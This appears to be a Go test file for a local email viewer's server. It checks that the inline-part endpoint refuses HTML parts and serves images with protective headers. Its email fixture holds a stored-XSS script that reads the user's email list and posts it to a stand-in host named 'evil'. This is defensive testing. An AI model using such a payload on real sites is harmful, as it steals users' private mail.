package server

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/hwhang0917/local-eml/internal/importer"
	"github.com/hwhang0917/local-eml/internal/paths"
)

const cidFixture = `From: sender@example.com
Subject: inline parts
MIME-Version: 1.0
Content-Type: multipart/related; boundary="B"

--B
Content-Type: text/html

<img src="cid:payload"><img src="cid:logo">
--B
Content-Type: text/html
Content-ID: <payload>
Content-Disposition: inline

<script>fetch('/api/emails').then(r=>r.text()).then(t=>fetch('//evil',{method:'POST',body:t}))</script>
--B
Content-Type: image/png
Content-ID: <logo>
Content-Disposition: inline
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==
--B--
`

func newCIDTestServer(t *testing.T) (*Server, string) {
	t.Helper()
	dir := t.TempDir()
	p := paths.Paths{Base: dir, EML: filepath.Join(dir, "eml"), DB: filepath.Join(dir, "db"),
		Logs: filepath.Join(dir, "logs"), Keys: filepath.Join(dir, "keys")}
	if err := p.EnsureDirs(); err != nil {
		t.Fatalf("ensure dirs: %v", err)
	}
	sha := strings.Repeat("a", 64)
	if err := os.WriteFile(p.BlobFor(sha), []byte(cidFixture), 0o600); err != nil {
		t.Fatalf("write blob: %v", err)
	}
	return &Server{Importer: &importer.Importer{Paths: p}}, sha
}

// A crafted message can declare an inline part as text/html. Serving it with
// that Content-Type would make /api/emails/{sha}/cid/{cid} a stored-XSS sink
// on our own origin, reachable by opening the image in a new tab.
func TestCIDRejectsNonImageParts(t *testing.T) {
	s, sha := newCIDTestServer(t)
	rec := httptest.NewRecorder()
	s.Router().ServeHTTP(rec, newLoopbackRequest(http.MethodGet, "/api/emails/"+sha+"/cid/payload", nil))

	if rec.Code != http.StatusUnsupportedMediaType {
		t.Fatalf("status = %d, want 415; body=%s", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); strings.Contains(ct, "text/html") {
		t.Errorf("served attacker-controlled Content-Type %q", ct)
	}
	if strings.Contains(rec.Body.String(), "<script>") {
		t.Errorf("script payload reached the response body: %s", rec.Body.String())
	}
}

func TestCIDServesImagesWithSniffingDisabled(t *testing.T) {
	s, sha := newCIDTestServer(t)
	rec := httptest.NewRecorder()
	s.Router().ServeHTTP(rec, newLoopbackRequest(http.MethodGet, "/api/emails/"+sha+"/cid/logo", nil))

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
	}
	for header, want := range map[string]string{
		"Content-Type":            "image/png",
		"X-Content-Type-Options":  "nosniff",
		"Content-Disposition":     "inline",
		"Content-Security-Policy": "default-src 'none'; sandbox",
	} {
		if got := rec.Header().Get(header); got != want {
			t.Errorf("%s = %q, want %q", header, got, want)
		}
	}
	if rec.Body.Len() == 0 {
		t.Error("image body was empty")
	}
}
